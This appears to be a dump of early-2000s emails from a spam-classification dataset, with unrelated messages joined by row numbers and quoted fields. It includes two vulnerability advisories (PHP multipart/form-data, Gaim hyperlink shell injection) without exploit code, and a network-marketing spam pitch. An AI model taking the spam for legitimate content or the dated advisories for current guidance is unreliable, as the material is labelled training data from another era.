 clients can handle IMAP. Users should be able to quickly move ""spam"" into the spam 
 folder. 
 
 Instead of deleting messages (or, by reprogramming the delete function) they can 
 quickly move ham into the ham folder.
 
 In either case, the message would be processed and then destroyed.

 I found a nice little Perl script for this purpose called rotate, which 
 makes the process of rotating log files very simple.  If there's an 
 official source for this script, I couldn't find it.  (My hosting 
 provider, pair.com, has it installed, and that's where I found it.) 
  However, redistribution appears to be allowed, so I've attached it.
 
 Good luck...

    <font size=""3""><b>Why we're changing our publishing schedule</b></font>
 
 <br><br>
 
 Dear Reader,
 <p>
 As of Monday, July 15, AnchorDesk is being published on Mondays, Wednesdays, and Fridays, instead of five days a week. The AnchorDesk Weekly newsletter will continued to be published every Friday
 <p>
 Why are we doing this? There are several reasons, but the most important one is giving me a chance do more than just sit behind a desk typing all day in order to meet deadlines.  I've been writing five columns a week for 18 months now, and I'd be lying to you if I didn't admit to being more than a little tired.  
 <p>
 Also, I've been on such a short leash that I haven't been able to travel or meet as many people as I'd like. This new schedule means I'll have more time to get out, learn more, see more products, and discover new issues or trends. So it should result in a more interesting and useful AnchorDesk for you.
 <p>
 Having additional time also means I will be able to work on several projects I've been assigned, including one that could bear fruit at the Consumer Electronics Show next January. More about that soon, once all the details are nailed down.
 <p>
 For now, the new schedule is being called a ""test,"" which means it could turn out to be temporary--or maybe not. We'll run it through the end of the summer and see how it works. 
 <p>
 I appreciate your continued support of AnchorDesk. While the column will be less frequent, I will still be on <a href=""http://clickthru.online.com/Click?q=34-pJpSIcd8ldb3QT23_tvVyn4IcgyR"" >CNET Radio</a> every weekday at noon PT (or on-demand streaming anytime) and hope you will join me there.
 <p>
 Sincerely,
 <p>
 
 David Coursey<br>
 Executive Editor<br>

206,"Subject: RE: use of base image / delta image for automated recovery from a
","I did something crudely along those lines for VMS VAX maybe 13 years
 ago; there is at least one product that does it for PC though I don't
 recall its name. It is also handy for cases where you have a CD image
 of some filesystem (or some other image of a filesystem) that is
 intrinsically readonly but whose filesystem will not accept (or is
 not graceful) readonly storage. It is also more or less necessary
 if you want to work with WORM file structures, which are older still.
 There have been a number of filesystems for those dating back to the
 early 1980s if not before.
 
 A generic facility of the type you mention is also one way to implement
 snapshots on top of an existing filesystem. The written information
 must (obviously!) be seekable so you can provide the illusion that you
 wrote to the storage. A device level implementation is however perfectly
 adequate.
 
 It does not, of course, distinguish for you what should have been changed
 and what should not. If you truly know a device (or perhaps a partition)
 must not be written, it can be simpler to either return error on writes,
 or to just return a fake success on writes yet discard the data. (NTFS
 lives with the latter strategy just fine from my experiments. I have not
 tried it on extf3 or reiser.) 
 
 BTW, think about your mention of RAID and consider the complexity of
 writing to RAID4 or RAID5...
 I would contend that with cheaper storage these days, it makes little sense
 to use RAID, save for shadowing and possibly striping. Those at least do
 not have the complexity and slowup dangers that higher RAID levels have, and
 there is not a need to save the cost of disk so much where a single disk
 may hold 200 gigs and up. Why not dedicate another whole disk to fault
 recovery
 and lose the complexity and slow write (sometimes) of RAID?

 Subject: use of base image / delta image for automated recovery from
 attacks
 
 
 Hi,
 
 I was inspired by a mode of operation supported by VMWare. You can have a
 base disk image shared by multiple virtual machine (vm) instances. That base
 image is never altered by a vm instance. Instead, each vm instance writes
 changes to its own ""redo"" log. Future hard disk reads from that vm instance
 incorporate both the base image and the appropriate redo log to present the
 current disk image for that specific virtual machine.
 
 This is described here (thanks to Duane for providing this link on the
 honeypots mailing list)
 http://www.vmware.com/support/reference/common/disk_sharing.html
 
 Could this basic concept be used to easily make self-fixing client/server
 applications that efficiently and automatically recover from most attacks,
 even before those attacks have been discovered? Here is what I imagine.
 
 The physical architectures of most production client/server systems are
 layered. For example, your basic web application might have a web server
 running Apache, connected to an application server running some J2EE or .Net
 business logic, connected to a database server for persistence. The only one
 of these whose disk image really should evolve over time is the database
 server, and even here you often put the static RDBMS software on one
 partition and the changeable datafiles on another partition. It is only the
 partition with the volatile datafiles that must be allowed to change from
 one boot to the next. Other paritions may need to be writable for, say, swap
 space, but these changes could be eliminated on each reboot.
 
 When someone cracks this system, they will probably change an image that
 shouldn't be changed. E.g., they might leverage a buffer overflow in IIS or
 Apache to install a trojan or a backdoor on the more exposed web server. But
 what if the web server ran off a base image, writing changes to a ""delta"" or
 ""redo"" partition? And then what if every night it automatically erased the
 redo partition and rebooted? The downtime involved for each machine would be
 minimal, because it is only deleting data - rather than restoring from
 backup. In a system with redundant web servers for load balancing or high
 availability, this could be scheduled in a way such that the system is
 always accessible. This base/redo partition concept could be implemented at
 the same level as a feature of hardware RAID, allowing for greater
 performance, reliability, and hack resistance. This concept could also be
 applied to the application servers, and even the database server partitions
 (except for those partitions which contain the table data files, of course.)
 
 Does anyone do this already? Or is this a new concept? Or has this concept
 been discussed before and abandoned for some reasons that I don't yet know?
 I use the physical architecture of a basic web application as an example in
 this post, but this concept could of course be applied to most server
 systems. It would allow for the hardware-separation of volatile and
 non-volatile disk images. It would be analogous to performing nightly
 ghosting operations, only it would be more efficient and involve less (or
 no) downtime.
 
 Thanks for any opinions,
 Ben

 Everything else :)  I can't even mark text in an exmh message window

 Hmmm... I don't see any :-)
 
 My main concern is that when rebuilding the recent packages I've made for
 Psyche on Valhalla, I'd need to lower the ""Release:"" tag (to keep an
 upgrade working), and that would f*ck up my CVS repository which is on my
 Valhalla box (well, I'm exagerating, It'll just make it more difficult for
 me) ;-)
 Sure, there are easy ways around this, but the easiest for me will be to
 wait until I upgrade my main box to Psyche and have Valhalla only on a
 secondary rebuild system.

 The Bug Count Also Rises
 
 
 by John Browne
 (Imitation Hemingway Contest Winner)
 
 In the fall of that year the rains fell as usual and washed the leaves 
 of the dust and dripped from the leaves onto the ground. The shuttles 
 drove through the rainy streets and took the people to meetings, then 
 later brought them back, their tires spraying the mist into the air.
 
 Many days he stood for a long time and watched the rain and the shuttles 
 and drank his double-tall mochas. With the mochas he was strong.
 
 Hernando who worked down the hall and who was large with microbrews came 
 to him and told him that the ship day was upon them but the bugs were 
 not yet out. The bugs which were always there even when you were in 
 Cafes late at night sipping a Redhook or a double-tall mocha and you 
 thought you were safe but they were there and although Enrico kept the 
 floor swept clean and the mochas were hot the bugs were there and they 
 ate at you.
 
 When Hernando told him this he asked how many bugs. ""The RAID is huge 
 with bugs,"" Hernando said. ""The bugs are infinite.""
 
 ""Why do you ask me? You know I cannot do this thing anymore with the bugs.""
 
 ""Once you were great with the bugs,"" Hernando said. ""No one was 
 greater,"" he said again. ""Even Prado.""
 
 ""Prado? What of Prado? Let Prado fix the bugs.""
 
 Hernando shrugged. ""Prado is finished. He was gored by three Sev 2's in 
 Chicago. All he does now is drink herb tea and play with his screensavers.""
 
 ""Herb tea?""
 
 ""It is true, my friend."" Hernando shrugged again. Later he went to his 
 office and sat in the dark for a long time. Then he sent e-mail to Michaels.
 
 Michaels came to him while he was sipping a mocha. They sat silently for 
 awhile, then he asked Michaels, ""I need you to triage for me.""
 
 Michaels looked down. ""I don't do that anymore,"" he said.
 
 ""This is different. The bugs are enormous. There are an infinity of bugs.""
 
 ""I'm finished with that,"" Michaels said again. ""I just want to live 
 quietly.""
 
 ""Have you heard Prado is finished? He was badly gored. Now he can only 
 drink herb tea.""
 
 ""Herb tea?"" Michaels said.
 
 ""It is true,"" he said sorrowfully.
 
 Michaels stood up. ""Then I will do it, my friend,"" he said formally. ""I 
 will do it for Prado, who was once great with the bugs. I will do it for 
 the time we filled Prado's office with bouncy balls, and for the time 
 Prado wore his nerf weapons in the marketing hall and slew all of them 
 with no fear and only a great joy at the combat. I will do it for all 
 the pizza we ate and the bottles of Coke we drank.""
 
 Together they walked slowly back, knowing it would be good. As they 
 walked the rain dripped softly from the leaves, and the shuttles carried 
 the bodies back from the meetings.

 SUMMARY
 
 As part of an ongoing NASA/UAH joint project, Dr. John Christy of UAH and Dr. Roy Spencer of NASA's Marshall Space Flight Center use data gathered by microwave sounding units (MSUs) on National Oceanic and Atmospheric Administration TIROS-N satellites to get accurate, direct measurements of atmospheric temperatures for almost all regions of the Earth, including remote deserts, rain forests and oceans for which reliable temperature data are not otherwise available.
 
 The accuracy and reliability of temperature data gathered by the satellites since January 1979 has been confirmed by comparing the satellite data to independent temperature data. A recent study (1) found a 97 percent agreement between the MSU data and temperatures measured by thermometers suspended beneath weather balloons released by meteorologists for weather observations.
 
 Once the monthly temperature data is collected from the satellites and processed, it is placed in a ""public"" computer file for immediate access by atmospheric scientists in the U.S. and abroad. It has become the basis for a number of major studies in global climate change, and is cited in reports from the Intergovernmental Panel on Climate Change.
 
 
 
 GATHERING THE DATA
 
 While traditional thermometers measure the temperature at a specific point in the air, a microwave sounding unit on a satellite takes readings that are average temperatures in a huge volume of the atmosphere. Each of the more than 30,000 readings per day per satellite is an average temperature for more than 75,000 cubic kilometers of air.
 
 The MSU makes a direct measurement of the temperature by looking at microwaves emitted by oxygen molecules in the atmosphere. The intensity of the microwave emissions - their ""brightness"" - varies according to temperature.
 
 Christy and Spencer developed a method to take the data from several satellites and produce a unified temperature dataset.
 
 
 
 VERIFYING THE ACCURACY OF MSU MEASUREMENTS
 
 A recent comparison (1) of temperature readings from two major climate monitoring systems - microwave sounding units on satellites and thermometers suspended below helium balloons - found a ""remarkable"" level of agreement between the two.
 
 To verify the accuracy of temperature data collected by microwave sounding units, Christy compared temperature readings recorded by ""radiosonde"" thermometers to temperatures reported by the satellites as they orbited over the balloon launch sites.
 
 He found a 97 percent correlation over the 16-year period of the study. The overall composite temperature trends at those sites agreed to within 0.03 degrees Celsius (about 0.054 Fahrenheit) per decade. The same results were found when considering only stations in the polar or arctic regions.
 
 ""The idea was to determine the reliability of the satellite data by comparing it to an established independent measurement,"" Christy said. ""If satellite data are reliable when the satellites are over the radiosonde sites, that means you should be able to trust them everywhere else.""
 
 The 99 radiosondes reported an aggregate warming trend of 0.155 degrees Celsius (about 0.28 Fahrenheit) per decade since 1979. Over those 99 spots on the globe, the satellites also recorded a warming trend: 0.128 degrees Celsius (about 0.23 Fahrenheit) per decade.
 
 Globally, however, the satellite data show a cooling trend of 0.03 degrees Celsius per decade since the first NOAA TIROS-N satellites went into service.
 
 ""These 99 radiosonde launch sites are just not distributed evenly around the planet,"" Christy said. ""They are not representative of the total globe.""
 
 Radiosonde balloons are released from stations around the world, usually at noon and midnight Greenwich standard time. As each balloon climbs from the surface to the stratosphere, the temperature is measured and relayed to the ground by radio.
 
 While there are more than 1,000 radiosonde launch sites globally, the data from many sites either are not readily available or are not consistently collected. Christy used data from 99 sites at which there has been long-term systematic and reliable data collection. These 99 radiosonde launch sites are in a box bounded by Iceland, Trinidad, Truk Island and Alaska.
 
 In an earlier study, an upper air temperature record compiled by NOAA from 63 daily weather balloon sites around the world indicated a 17-year climate trend of -0.05 C per decade, which was in exact agreement with the satellite data at that time, Christy said.
 
 
 
 GLOBAL COVERAGE
 
 One advantage of the MSU dataset is its global coverage. Microwave sounding units aboard NOAA satellites directly measure the temperature of the atmosphere over more than 95 percent of the globe. Each satellite measures the temperature above most points on Earth every 12 hours.
 
 The 'global temperature' that has been frequently reported from surface measurements is neither global in extent nor systematic in measurement method. It neglects vast oceanic and continental regions, including Antarctica, the Brazilian rain forests, the Sahara Desert and Greenland.
 
 The most commonly cited historical temperature dataset is from ground-based thermometers. More than 5,000 thermometers worldwide provide almost instantaneous local temperature data through links to weather services and scientists.
 
 Most of these thermometers, which are usually in small shelters about five feet above the ground, are in areas easily accessible to people. In the U.S. and other industrial countries, these thermometers are most often found at airports.
 
 The ground-based network is extensive in North America, Europe, Russia, China and Japan. It is less comprehensive in Africa, South America, Australia and across much of Southern Asia.
 
 Temperatures on the surface and vertically through the atmosphere are gathered daily by thermometers carried aloft by helium balloons. ""Radiosonde"" balloons are released from stations around the world, usually at noon and midnight Greenwich standard time.
 
 While balloon release sites are scattered throughout the world, they are concentrated in industrial nations. There are more than 1,000 radiosonde launch sites globally. If they were evenly distributed around the world, that would equal approximately one for every 195,000 square miles of the Earth's surface.
 
 Water temperatures, which are used to derive estimates of atmospheric temperatures, come from thermometers on piers and buoys, and aboard ""ships of opportunity."" The ships record the temperature of water drawn in to cool their engines. The water temperature data from these instruments is also not global in its coverage, tending instead to be concentrated in heavily-travelled shipping lanes, and in harbors.
 
 In the past 12 years, a new system of approximately 100 deep ocean buoys has been established, gathering both atmospheric and water temperature data.
 
 
 
 INSTRUMENT ACCURACY; MSU
 
 With nine satellites measuring the temperature over periods of from one to six years, a method was devised to merge all the data into a single, consistent time series.
 
 Each satellite has its own bias that, if not calculated and removed, would introduce spurious trends. The biases are calculated by directly comparing each satellite with others in operation at that time. Periods of overlapping operation ranged from three months to three years, and were sufficient to determine these biases.
 
 Because the MSU instruments are so stable and have so many thousands of observations, the biases between the satellites are known to within 0.01 deg. The final product removes these biases so that all data are referenced to a common base. (2)
 
 To check the final product, comparisons were made over a 16-year period with balloon measurements as stated above, and the phenomenal agreement provided the independent validation necessary to conclude that the merging technique developed for this dataset was accurate.
 
 
 
 INSTRUMENT ACCURACY; GROUND-BASED THERMOMETERS
 
 Of great concern to scientists is the lack of consistency in the way readings are taken and in the thermometer surroundings. Since most thermometers for which long-term records exist are in towns and cities, the effects of population growth and the construction of nearby roads, parking lots, runways and buildings may cause the temperature to rise a little due of urbanization. This temperature change may be an artifact of a local ""asphalt effect"" rather than a long-term widespread climate change.
 
 
 
 INSTRUMENT ACCURACY; SHIPS OF OPPORTUNITY
 
 While the temperature data collected by ships at sea is reported as a sea surface temperature, this data reflects water temperatures from about three to 60 feet below the surface - the level from which water is drawn into the ships.
 
 The thousands of individual thermometers used to collect this data are not calibrated against a scientific standard, nor is there a method for verifying the accuracy of either the thermometers or the reports matching temperature readings to specific times and places.
 
 Only in places where there are many overlapping observations can there be any confidence in their accuracy.
 
 
 
 THE SCIENTISTS
 
 In 1996, Spencer and Christy received the American Meteorological Society's Special Award. They were honored ""for developing a global, precise record of the Earth's temperature from operational polar-orbiting satellites, fundamentally advancing our ability to monitor climate.""
 
 AMS Special Awards are given to individuals or organizations not appropriately recognized by more specifically-defined awards, and who have made important contributions to the science or practice of meteorology or to the society.
 
 In 1991, Spencer and Christy received NASA's Exceptional Scientific Achievement Medal.

 This is very good news! Will this allow for individual spam word file

 much for a great project.

      Advisory: Remote Compromise/DOS Vulnerability in PHP
  Release Date: 2002/07/22
 Last Modified: 2002/07/22
        Author: Stefan Esser [s.esser@e-matters.de]
 
   Application: PHP 4.2.0, 4.2.1
      Severity: A vulnerability within the multipart/form-data handler
                could allow remote compromise of the web server.
          Risk: Critical
 Vendor Status: Patches Released.
     Reference: http://security.e-matters.de/advisories/022002.html
 
 
 
 Overview:
 	
    We have discovered a serious vulnerability within the default version 
    of PHP. Depending on the processor architecture it may be possible for a 
    remote attacker to either crash or compromise the web server. 
  
 	
 Details:
 
    PHP 4.2.0 introduced a completely rewritten multipart/form-data POST 
    handler. While I was working on the code in my role as PHP developer
    i found a bug within the way the mime headers are processed. 
    A malformed POST request can trigger an error condition, that is not
    correctly handled. Due to this bug it could happen that an uninit-
    ialised struct gets appended to the linked list of mime headers.
    When the lists gets cleaned or destroyed PHP tries to free the pointers
    that are expected in the struct. Because of the lack of initialisation
    those pointers contain stuff that was left on the stack by previous
    function calls. 
 
    On the IA32 architecture (aka. x86) it is not possible to control what
    will end up in the uninitialised struct because of the stack layout. All 
    possible code paths leave illegal addresses within the struct and PHP
    will crash when it tries to free them.
 
    Unfortunately the situation is absolutely different if you look on a
    solaris sparc installation. Here it is possible for an attacker to free
    chunks of memory that are full under his control. This is most probably
    the case for several more non IA32 architectures.
 
    Please note that exploitability is not only limited to systems that are
    running malloc()/free() implementations that are known to be vulnerable
    to control structure overwrites. This is because the internal PHP memory
    managment implements its own linked list system that can be used to
    overwrite nearly arbitrary memory addresses.
    
 
 Proof of Concept:
 
    e-matters is not going to release the exploit for this vulnerability to
    the public.
    
 
 Vendor Response:
 
    22th July 2002 - An updated version of PHP which fixes this 
                     vulnerability was released and can be downloaded at:
 
                        http://www.php.net/downloads.php
 
                     The vendor announcement is available at:
 
                        http://www.php.net/release_4_2_2.php
 
 
 Recommendation:
 
    If you are running PHP 4.2.x you should upgrade as soon as possible,
    especially if your server runs on a non IA32 CPU. If you cannot upgrade
    for whatever reason the only way to workaround this, is to disable all
    kinds of POST requests on your server.

","Well, I tried the Ximian GNOME 2.0 packages from
 http://apt.sunnmore.net, and have to say, it was a let-down.  Ran
 'apt-get update' , 'apt-get install gnome-session' then 'apt-get
 upgrade' and Nautilus failed to execute, couldn't get any help docs to
 come up, along with more problems.  So, with the luck of 'rpm -qa|grep
 ximian' then removing by hand all ximian packages with 'rpm -e --nodeps'
 and reinstalling everything GNOME and GNOME-related with apt, I got
 trusty old Red Hat 7.3 GNOME back on the desktop, and the only trace of
 Ximian is Evolution, again, thanks to apt from this site.
 
 I really liked Ximian (back then, Helix ?) at first but, to me, Red
 Hat's GNOME, released with 7.3 seems much more pretty and up-to-date. 
 Could this be because of inclusion of gtk2 in RH 7.3?

 It looks like you're running via procmail -- what are the permissions
 on procmail?  ""Insecure dependency"" screams ""I'm in taint mode!"", which
 is a typical problem when procmail is setuid/setgid (the permissions
 should be 755).
 
 If this is in fact the problem, an easy solution is to put ""DROPPRIVS=yes""
 in the procmailrc. :)

 There's a brief discussion of this before the definition of
 MAX_DISCRIMINATORS.  All clues with prob MIN_SPAMPROB and MAX_SPAMPROB are
 saved in min and max lists, and all other clues are fed into the nbest heap.
 Then the shorter of the min and max lists cancels out the same number of
 clues in the longer list.  Whatever remains of the longer list (if anything)
 is then fed into the nbest heap too, but no more than MAX_DISCRIMINATORS of
 them.  In no case do more than MAX_DISCRIMINATORS clues enter into the final
 probability calculation, but all of the min and max lists go into the list
 of clues (else you'd have no clue that massive cancellation was occurring;
 and massive cancellation may yet turn out to be a hook to signal that manual
 review is needed).  In your specific case, the excess of clues in the longer
 MAX_SPAMPROB list pushed everything else out of the nbest heap, and that's
 why you didn't see anything other than 0.01 and 0.99.
 
 Before adding these special lists, the outcome when faced with many 0.01 and
 0.99 clues was too often a coin toss:  whichever flavor just happened to
 appear MAX_DISCRIMINATORS//2 + 1 times first determined the final outcome.

 I just beat it <wink>:  a tokenization scheme that folds case, and ignores
 punctuation, and strips a trailing 's' from words, and saves both word
 bigrams and word unigrams, turned up a low-probability very long spam with a
 list of 410 0.01 clues and 125 0.99 clues!  Yikes.

 No matter how often it says Zope, it gets only one 0.01 clue from doing so.
 Ditto for ZEO.  In contrast, HTML markup has many unique ""words"" that get
 0.99.  BTW, this is a clear case where the assumption of
 conditionally-independent word probabilities is utterly bogus -- e.g., the
 probability that ""<body>"" appears in a message is highly correlated with the
 prob of ""<br>"" appearing.  By treating them as independent, naive Bayes
 grossly misjudges the probability that both appear, and the only thing you
 get in return is something that can actually be computed <wink>.
 
 Read the ""What about HTML?"" section in tokenizer.py.  From the very start,
 I've been investigating what would work best for the mailing lists hosted at
 python.org, and HTML decorations have so far been too strong a clue to
 justify ignoring it in that specific context.  I haven't done anything
 geared toward personal email, including the case of non-mailing-list email
 that happens to go through python.org.
 
 I'd prefer to strip HTML tags from everything, but last time I tried that it
 still had bad effects on the error rates in my corpora (the full test
 results with and without HTML tag stripping is included in the ""What about
 HTML?"" comment block).  But as the comment block also says,
 
 # XXX So, if another way is found to slash the f-n rate, the decision here
 # XXX not to strip HTML from HTML-only msgs should be revisited.
 
 and we've since done several things that gave significant f-n rate
 reductions.  I should test that again now.
 
 > Are there any minable-but-unmined header lines in your corpus left?
 
 Almost all of them -- apart from MIME decorations that appear in both
 headers and bodies (like Content-Type), the *only* header lines the base
 tokenizer looks at now are Subject, From, X-Mailer, and Organization.
 
 > Or do we have to start with a different corpus before we can make
 > progress there?
 
 I would need different data, yes.  My ham is too polluted with Mailman
 header decorations (which I may or may not be able to clean out, but fudging
 the data is a Mortal Sin and I haven't changed a byte so far), and my spam
 too polluted with header clues about the fellow who collected it.  In
 particular I have to skip To and Received headers now, and I suspect they're
 going to be very valuable in real life (for example, I don't even catch
 ""undisclosed recipients"" in the To header now!).

 Ah!  That explains why the HTML tags didn't get stripped.  I'd again offer
 to add an optional argument to tokenize() so that they'd get stripped here
 too, but if it gets glossed over a third time that would feel too much like
 a loss <wink>.

 I reported on tests I ran with random samples of 220 spams and 220 hams from
 my corpus (that means training on sets of those sizes as well as predicting
 on sets of those sizes), and while that did harm the error rates, the error
 rates I saw were still much better than Jeremy reported when using 500 of
 each.
 
 
 Ah, a full test run just finished, on the
 
    tokenization scheme that folds case, and ignores punctuation, and strips
 a
    trailing 's' from words, and saves both word bigrams and word unigrams
 
 This is the code:
 
             # Tokenize everything in the body.
             lastw = ''
             for w in word_re.findall(text):
                 n = len(w)
                 # Make sure this range matches in tokenize_word().
                 if 3 <= n <= 12:
                     if w[-1] == 's':
                         w = w[:-1]
                     yield w
                     if lastw:
                         yield lastw + w
                     lastw = w + ' '
 
                 elif n >= 3:
                     lastw = ''
                     for t in tokenize_word(w):
                         yield t
 
 where
 
     word_re = re.compile(r""[\w$\-\x80-\xff]+"")
 
 This at least doubled the process size over what's done now.  It helped the
 f-n rate significantly, but probably hurt the f-p rate (the f-p rate is too
 low with only 4000 hams per run to be confident about changes of such small
 *absolute* magnitude -- 0.025% is a single message in the f-p table):

 I can copy the RedHat official download ISO's. I can't
 call it redhat if I sell it, so I can give you copies

 Failing that, I have the 7 CD's from Woody (Debian 3.0).
 Otheriwse, you need to find  a different source.

 Freak show. Obviously there _was_ some sort of patterns to the data:
 
 Training on Data/Ham/Set1 & Data/Spam/Set1 ... 1798 hams & 1546 spams
       0.779   0.582
       0.834   0.840
       0.945   0.452

 (before the shuffle, I was seeing:
 total false pos 273 3.03501945525
 total false neg 367 4.74282760403
 )
 
 For sake of comparision, here's what I see for partitioned into 2 sets:
 
 Training on Data/Ham/Set1 & Data/Spam/Set1 ... 4492 hams & 3872 spams
       0.490   0.776

","A great sponsor will not make you money.
 A great product line will not make you money either.
 A great compensation plan will not make you money either.
 A great company will not make you money either.
 
 Some say it's a combination of the above.
 Some say it's what's inside you that matters the most.
 
 Forget about meetings, one-on-one, 3-ways calls, etc.
 Those old ways of network marketing has come and gone.
 They wear you out long before you make any money.
 
 What makes you money is a downline associated with a
 stable company that has consumable products.
 
 Where's the downline coming from?  Well, we have an
 online automatic recruiting system that does the work
 for you.  Our system will place paying members in 
 your downline.
 
 Furthermore, you can see it working first hand before
 you decide what to do, if any.

 It seemed that way to me when I ripped the classifier out of it -- I don't
 think anyone has touched it after.

 Someone else will have to answer that (I don't use GBayes or hammie, at
 least not yet).

 That's been done now, right?

 Those tokenizers are truly trivial to rewrite from scratch if they're
 interesting.  The tiny spam/ham collections in GBayes are also worthless
 now.  The ""self test"" feature didn't do anything except print its results;
 Tester.py since became doctest'ed and verifies that some basic machinery
 actually delivers what it's supposed to deliver.
 
 > Therefore I propose to nuke GBayes.py, after adding a -u feature.
 
 +1 here.

 Did you actually attempt to order the DSL? Large chunks of somerville have
 advertised DSL service that can't actually be obtained. Excuses vary, from
 ""no available copper"" to ""full DSLAM"", but the folks I know who've wanted
 DSL around here have all failed, ending up either with ATTBB, RCN or an
 honest-to-god T1.

 This is scary.  I'm imagining tracerouting you and seeing links like ""Route
 84"" and ""Route 9, Exit 14"".  Obviously, this is illness induced.

","Hi,
 
 Thank you for the useful replies, I have found some interesting 
 tutorials in the ibm developer connection.
 
 https://www6.software.ibm.com/developerworks/education/j-sec1
 
 and
 
 https://www6.software.ibm.com/developerworks/education/j-sec2
 
 Registration is needed.
 
 I will post the same message on the Web Application Security list, as 
 suggested by someone.
 
 For now, I thing I will use md5 for password checking (I will use the 
 approach described in secure programmin fo linux and unix how-to).
 
 I will separate the authentication module, so I can change its 
 implementation at anytime.
 
 Thank you again!

243,"Subject: [ILUG] Update on  PC Cases
","Hi all, I posted the below question to this list so I thought I'd update you
 all. Thanks for your suggestions.
 
 Well, I'd decided to bite the bullet and spend big on a new case and CPU
 fan.
 
 I bought a lian-li aluminum case. It was expensive as cases go (stg133.86)
 but I decided, it's a good basis to build any future PC on.
 It has 4 x 51/4"" drive bays and 6 x 3"" drive bays so I should be ok for
 future upgrades etc. I have to say it was worth it. Its a pleasure to work
 on. It has a slide out tray to mount the Mother Board on, both sides come
 off, the drive bays come out...all without using a screwdriver (thumb
 screws). Even the edges inside the case are smooth so no banging your hands
 off shape edges etc. There are 4 fans inside the case, which can be set to 3
 different speeds. There are 4 usb ports on the front of the box too. The box
 is big and has loads of room inside.
 Oh... and it looks very cool :-)
 
 However there are 2 things to look out for. On the Maplins website it says
 
 * Up to three 80mm case fans can be fitted!
 * ATX Power supply sold separately
 
 In fact the case came with 4 fans and a power supply, which is great but I
 ordered 2 fans and a power supply separately.
 Also the case was a slightly different model to one advertised, as I got the
 USB model. It does say (Product may vary in design and specification from
 that show) but I missed that :-)
 
 I also bought a Flower Cooler Kit which is completely silent. Very nice.
 (thanks Mike)
 
 So now I can code-in-peace...
 
 Justin

 I wouldn't make that assumption.  I'd assume that rewrite_subject was on, 
 and report_header was off, because that's the default configuration, and 
 not everyone knows to go look in the user_prefs file to make those 
 changes.

251,"Subject: [Ximian Updates] Hyperlink handling in Gaim allows arbitrary code to be executed
","Severity: Security
 Product: gaim
 Keywords: gaim hyperlink manual
 References:

     http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2002-0989
   Gaim Changelog
     http://gaim.sourceforge.net/ChangeLog
 
 Gaim is an instant messaging client based on the published TOC
 protocol from AOL. The developers of Gaim, an instant messenger client
 that combines several different networks, found a vulnerability in the
 hyperlink handling code. The 'Manual' browser command passes an
 untrusted string to the shell without escaping or reliable quoting,
 permitting an attacker to execute arbitrary commands on the users
 machine. Unfortunately, Gaim doesn't display the hyperlink before the
 user clicks on it. Users who use other inbuilt browser commands aren't
 vulnerable.
 
 The fixed version of Gaim no longer passes the user's manual browser
 command to the shell. Commands which contain the %s in quotes will
 need to be amended, so they don't contain any quotes. The 'Manual'
 browser command can be edited in the 'General' pane of the
 'Preferences' dialog, which can be accessed by clicking 'Options' from
 the login window, or 'Tools' and then 'Preferences' from the menu bar
 in the buddy list window.
 
 Please download Gaim 0.59.1 or later using Red Carpet. You may also
 obtain this update from the Ximian FTP site.

 Actually, if I remember correctly from discussion of the list's
 composition in Forbes about five or six years ago, the *best* way to
 get on the Forbes 400 is to have *no* college at all. Can you say
 ""Bootstraps"", boys and girls? I knew you could...
 
 [Given that an undergraduate liberal arts degree from a state school,
 like, say, mine, :-), is nothing but stuff they should have taught
 you in a government-run ""high"" school, you'll probably get more of
 *those* on the Forbes 400 as well as time goes on. If we ever get
 around to having a good old fashioned government-collapsing
 transfer-payment depression (an economic version of this summer's
 government-forest conflagration, caused by the same kind of
 innumeracy that not clear-cutting enough forests did out west this
 summer :-)) that should motivate more than a few erst-slackers out
 there, including me, :-), to learn to actually feed themselves.]
 
 
 The *next* category on the Forbes 400 list is someone with a
 ""terminal"" professional degree, like an MBA, PhD, MD, etc., from the
 best school possible.
 
 Why? Because, as of about 1950, the *best* way to get into Harvard,
 for instance, is to be *smart*, not rich. Don't take my word for it,
 ask their admissions office. Look at the admissions stats over the
 years for proof.
 
 Meritocracy, American Style, was *invented* at the Ivy League after
 World War II. Even Stanford got the hint, :-), and, of course,
 Chicago taught them all how, right? :-). Practically *nobody* who
 goes to a top-20 American institution of higher learning can actually
 afford to go there these days. Unless, of course, their parents, who
 couldn't afford to go there themselves, got terminal degrees in the
 last 40 years or so. And their kids *still* had to get the grades,
 and ""biased"" (by intelligence :-)), test scores, to get in.
 
 
 The bizarre irony is that almost all of those people with ""terminal""
 degrees, until they actually *own* something and *hire* people, or
 learn to *make* something for a living all day on a profit and loss
 basis, persist in the practically insane belief, like life after
 death, that economics is some kind of zero sum game, that dumb people
 who don't work hard for it make all the money, and, if someone *is*
 smart, works hard, and is rich, then they stole their wealth somehow.
 
 BTW, none of you guys out there holding the short end of this
 rhetorical stick can blame *me* for the fact that I'm using it to
 beat you severely all over your collective head and shoulders. You
 were, apparently, too dumb to grab the right end. *I* went to
 Missouri, and *I* don't have a degree in anything actually useful,
 much less a ""terminal"" one, which means *I*'m broker than anyone on
 this list -- it's just that *you*, of all people, lots with
 educations far surpassing my own, should just plain know better. The
 facts speak for themselves, if you just open your eyes and *look*.
 There are no epicycles, the universe does not orbit the earth, and
 economics is not a zero-sum game. The cost of anything, including
 ignorance and destitution, is the forgone alternative, in this case,
 intelligence and effort.
 
 [I will, however, admit to being educated *waay* past my level of
 competence, and, by the way *you* discuss economics, so have you,
 apparently.]
 
 
 
 BTW, if we ever actually *had* free markets in this country,
 *including* the abolition of redistributive income and death taxes,
 all those smart people in the Forbes 400 would have *more* money, and
 there would be *more* self-made people on that list. In addition,
 most of the people who *inherited* money on the list would have
 *much* less of it, not even relatively speaking. Finally, practically
 all of that ""new"" money would have come from economic efficiency and
 not ""stolen"" from someone else, investment bubbles or not.
 
 That efficiency is called ""progress"", for those of you in The
 People's Republics of Berkeley or Cambridge. It means more and better
 stuff, cheaper, over time -- a terrible, petit-bourgeois concept
 apparently not worthy of teaching by the educational elite, or you'd
 know about it by now. In economic terms, it's also called an increase
 in general welfare, and, no, Virginia, I'm not talking about
 extorting money from someone who works, and giving it to someone who
 doesn't in order to keep them from working and they can think of some
 politician as Santa Claus come election time...
 
 
 In short, then, economics is not a zero sum game, property is not
 theft, the rich don't get rich off the backs of the poor, and
 redistributionist labor ""theory"" of value happy horseshit is just
 that: horseshit, happy or otherwise.
 
 To believe otherwise, is -- quite literally, given the time Marx
 wrote Capital and the Manifesto -- romantic nonsense.
 
 Cheers,
 RAH

 Broadband's killer application  the one activity that dwarfs all others 
 is online gaming, which 80 percent of South Koreans under 25 play, according
